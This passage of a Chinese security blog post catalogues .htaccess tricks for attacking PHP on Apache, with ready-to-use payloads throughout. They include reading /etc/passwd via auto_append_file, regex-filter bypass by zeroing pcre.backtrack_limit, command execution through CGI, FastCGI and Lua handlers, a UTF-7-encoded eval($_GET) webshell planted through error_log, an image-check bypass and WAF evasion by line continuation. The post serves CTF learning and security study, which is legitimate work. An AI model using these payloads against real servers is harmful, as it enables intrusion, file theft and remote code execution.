+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">If</span> <span class="err">&#34;</span><span class="na">file</span><span class="err">(&#39;/</span><span class="na">flag</span><span class="err">&#39;)</span> <span class="err">=~</span> <span class="err">&#39;/</span><span class="na">flag</span><span class="err">{</span><span class="na">a</span><span class="err">/&#39;&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">ErrorDocument 404 &#34;y4tacker&#34;
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">If</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>假设<code>flag</code>为<code>flag{testflag}</code>
+通过后面<code>flag{a</code>不断变换字符一直到<code>flag{t</code>，页面就会出现<code>y4tacker</code></p>
+<h2 id="正则失效">正则失效</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">php_value pcre.backtrack_limit <span class="m">0</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="正则失效的其他配置">正则失效的其他配置</h3>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>名字</th>
+<th>默认</th>
+<th>可修改范围</th>
+<th>更新日志</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>pcre.backtrack_limit</td>
+<td>100000</td>
+<td>PHP_INI_ALL</td>
+<td>php 5.2.0 起可用</td>
+</tr>
+<tr>
+<td>pcre.recursion_limit</td>
+<td>100000</td>
+<td>PHP_INI_ALL</td>
+<td>php 5.2.0 起可用用</td>
+</tr>
+<tr>
+<td>pcre.jit</td>
+<td>1</td>
+<td>PHP_INI_ALL</td>
+<td>PHP 7.0.0 起可用</td>
+</tr>
+</tbody>
+</table></div>
+<blockquote>
+<p>设置正则回朔次数来使正则匹配的结果返回为 false 而不是0 ，从而可以绕过正则</p>
+</blockquote>
+<h2 id="本地文件包含">本地文件包含</h2>
+<p>当前目录下php文件头引入<code>/etc/passwd</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-PHP" data-lang="PHP"><span class="line"><span class="cl"> <span class="nx">php_value</span> <span class="nx">auto_append_file</span> <span class="o">/</span><span class="nx">etc</span><span class="o">/</span><span class="nx">passwd</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>使作用范围内的php文件在文件头/尾自动include指定文件，支持php伪协议</p>
+<h2 id="修改默认路径">修改默认路径</h2>
+<p><code>.htaccess</code>可以设置<code>php_value include_path &quot;xxx&quot;</code>将<code>include()</code>的默认路径改变</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">php_value</span> <span class="nx">include_path</span> <span class="s2">&#34;xxx&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>等价于</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s2">&#34;include_path&#34;</span><span class="p">,</span><span class="s2">&#34;../../../../../../../../&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s2">&#34;etc/passwd&#34;</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="cgi执行">Cgi执行</h2>
+<blockquote>
+<p>如果开启了 cgi 扩展，也可以来解析shell脚本，也就是说cgi_module 需要加载</p>
+</blockquote>
+<p><code>apache2.conf</code>中有</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">LoadModule cgi_module modules/mod_cgi.so
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>那么可在<code>.htaccess</code>中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Options +ExecCGI #允许CGI执行
+</span></span><span class="line"><span class="cl">AddHandler cgi-script .sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>写一个脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="nb">echo</span> <span class="s2">&#34;Content-Type: text/plain&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">ls /
+</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="fastcgi执行">FastCgi执行</h2>
+<p>需要tomcat配置</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">LoadModule fcgid_module modules/mod_fcgid.so
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>那么可在<code>.htaccess</code>中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Options +ExecCGI
+</span></span><span class="line"><span class="cl">AddHandler fcgid-script .kk
+</span></span><span class="line"><span class="cl">FcgidWrapper &#34;/bin/ls /&#34; .kk
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>再写一个<code>y4.kk</code>文件，内容随意</p>
+<p>最后会执行<code>.htaccess</code>中的内容</p>
+<h2 id="lua执行">Lua执行</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">AddHandler lua-script .lua
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>写一个lua文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">require &#34;string&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">function handle(r)
+</span></span><span class="line"><span class="cl">    r.content_type = &#34;text/plain&#34;
+</span></span><span class="line"><span class="cl">    local t = io.popen(&#39;/readflag&#39;)
+</span></span><span class="line"><span class="cl">    local a = t:read(&#34;*all&#34;)
+</span></span><span class="line"><span class="cl">    r:puts(a)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    if r.method == &#39;GET&#39; then
+</span></span><span class="line"><span class="cl">        for k, v in pairs( r:parseargs() ) do
+</span></span><span class="line"><span class="cl">            r:puts( string.format(&#34;%s: %s\n&#34;, k, v) )
+</span></span><span class="line"><span class="cl">        end
+</span></span><span class="line"><span class="cl">    else
+</span></span><span class="line"><span class="cl">        r:puts(&#34;Unsupported HTTP method &#34; .. r.method)
+</span></span><span class="line"><span class="cl">    end
+</span></span><span class="line"><span class="cl">end
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="利用报错信息写马">利用报错信息写马</h2>
+<p>首先写入<code>.htaccess</code> error_log 相关的配置</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php_value include_path &#34;/tmp/xx/+ADw?php die(eval($_GET[1]))+ADs +AF8AXw-halt+AF8-compiler()+ADs&#34;
+</span></span><span class="line"><span class="cl">php_value error_reporting 32767
+</span></span><span class="line"><span class="cl">php_value error_log /tmp/fl3g.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>上面那些神奇字符是utf7编码，可以用下面的方式得到</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">$filename = &#34;php://filter/write=convert.iconv.utf-8.utf-7/resource=y4.txt&#34;; //utf-16le编码写入文件
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">file_put_contents($filename, &#34;&lt;?php phpinfo();?&gt;&#34;)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>也可以通过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mb_convert_encoding(&#39;&lt;?php eval($_GET[\&#39;cmd\&#39;]); ?&gt;&#39;,&#34;utf-7&#34;);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后访问<code>index.php</code>，留下error_log</p>
+<p>这时<code>.htaccess</code>写入新配置</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php_value zend.multibyte 1
+</span></span><span class="line"><span class="cl">php_value zend.script_encoding &#34;UTF-7&#34;
+</span></span><span class="line"><span class="cl">php_value include_path &#34;/tmp&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>再访问一次<code>index.php?1=whoami</code></p>
+<h2 id="绕过exif_imagetype上传htaccess">绕过exif_imagetype()上传.htaccess</h2>
+<blockquote>
+<p>采用xbm格式X Bit Map，绕过exif_imagetype()方法的检测，上传文件来解析。在计算机图形学中，X Window系统使用X BitMap，一种纯文本二进制图像格式，用于存储X GUI中使用的光标和图标位图。XBM数据由一系列包含单色像素数据的静态无符号字符数组组成，当格式被普遍使用时，XBM通常出现在标题.h文件中，每个图像在标题中存储一个数组。也就是用c代码来标识一个xbm文件，前两个#defines指定位图的高度和宽度，以像素为单位</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#define width 20
+</span></span><span class="line"><span class="cl">#define height 10
+</span></span><span class="line"><span class="cl">xxxxxx
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="号绕过waf">\号绕过waf</h2>
+<p>比如过滤了file，我们可以使用</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php_value auto_prepend_fi\
+</span></span><span class="line"><span class="cl">le .htaccess
+</span></span><span class="line"><span class="cl">#&lt;?php phpinfo();
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="号绕过藏字符">\号绕过藏字符</h2>
+<p>假设在写入文件同时后面默认加上<code>file_put_contents($filename, $content . &quot;\nhappy&quot;)</code>，我们payload最后可以加上#\，#负责注释</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php_value include_path &#34;/tmp&#34;
+</span></span><span class="line"><span class="cl">php_value zend.multibyte 1
+</span></span><span class="line"><span class="cl">php_value zend.script_encoding &#34;UTF-7&#34;
+</span></span><span class="line"><span class="cl"># \
+</span></span><span class="line"><span class="cl">happy
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>\</code>将注释符和脏字符连成一行，注释掉脏字符</p>
+<h1 id="ref">Ref</h1>
+<p><a class="link" href="https://blog.csdn.net/solitudi/article/details/116666720"  target="_blank" rel="noopener"
+    >https://blog.csdn.net/solitudi/article/details/116666720</a></p>
+<p><a class="link" href="https://httpd.apache.org/docs/2.4/expr.html"  target="_blank" rel="noopener"
+    >https://httpd.apache.org/docs/2.4/expr.html</a></p>
+<p><a class="link" href="https://xz.aliyun.com/t/8267"  target="_blank" rel="noopener"
+    >https://xz.aliyun.com/t/8267</a></p>
+<p><a class="link" href="http://www.htaccess-guide.com/"  target="_blank" rel="noopener"
+    >http://www.htaccess-guide.com/</a></p>
+<p><a class="link" href="https://www.anquanke.com/post/id/185377#h3-4"  target="_blank" rel="noopener"
+    >https://www.anquanke.com/post/id/185377#h3-4</a></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/.htaccess/">.Htaccess</a>
+        
+            <a href="/tags/php/">Php</a>
+        
+            <a href="/tags/bypass/">Bypass</a>
+        
+            <a href="/tags/exploit/">Exploit</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/phpexitdeathbypass/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241226182819883.png" loading="lazy" data-key="Phpexitdeathbypass" data-hash="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241226182819883.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">php exit 死亡绕过</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/phpfilterworks/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241217141336178.png" loading="lazy" data-key="PhpFilterWorks" data-hash="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241217141336178.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">PHP Filter 伪协议实现细节</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/pte%E7%9F%A5%E8%AF%86%E8%AE%B0%E5%BD%95/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">PTE知识记录</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2025 DanSec
+    </section>
+    
+    <section class="powerby">
+        
+            Dan❤Anan <br/>
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.23.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
